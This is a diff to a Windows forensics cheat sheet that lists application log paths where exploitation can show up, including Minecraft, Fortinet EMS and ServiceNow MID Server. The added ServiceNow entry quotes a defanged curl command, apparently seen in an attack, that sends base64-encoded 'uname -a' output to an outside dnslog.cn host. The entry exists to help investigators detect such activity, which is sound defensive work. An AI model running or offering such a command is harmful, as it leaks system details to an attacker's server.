@@ -1487,7 +1487,7 @@ Possible Locations:
 Get-WmiObject -Class Win32_Product
 ```
 
-### Check various Installed Application Logs
+### Check various installed Application Logs
 
 - Can provide indications of any exploits especially for running servers such as TightVNC, Mail servers, etc.
 
@@ -1495,9 +1495,10 @@ Get-WmiObject -Class Win32_Product
 
 Common location for logs:
 - Minecraft: `C:\Users\LetsDefend\Desktop\Minecraft Server 1.12.2\logs`
-- Fortinet EMS Logs: `C:\Program Files (x86)\Fortinet\FortiClientEMS\logs\`
-
-Taken from [here](https://www.linkedin.com/posts/stephan-berger-59575a20a_my-team-colleague-asger-deleuran-s-investigated-activity-7217564988436033539-Sw0u?utm_source=share&utm_medium=member_ios)
+  
+- Fortinet EMS Logs: `C:\Program Files (x86)\Fortinet\FortiClientEMS\logs\`. Taken from [here](https://www.linkedin.com/posts/stephan-berger-59575a20a_my-team-colleague-asger-deleuran-s-investigated-activity-7217564988436033539-Sw0u?utm_source=share&utm_medium=member_ios)
+  
+- ServiceNow: `\\ServiceNow MID Server MID_Server_Prod\agent\logs\agent0.log.*`. Search for the following lines: `Dispatching event: 'MessageDispatchedEvent, message: Command <cmd>` which can show the commands being executed on servicenow especially due to remote code execution e.g. `curl hxxp://w2wlxu.dnslog.cn/?x=$(uname) -a|base64 -w0)`, as taken from [here](https://x.com/malmoeb/status/1814614969771544923)
 
 #### via dir / C: / System32 logs
 
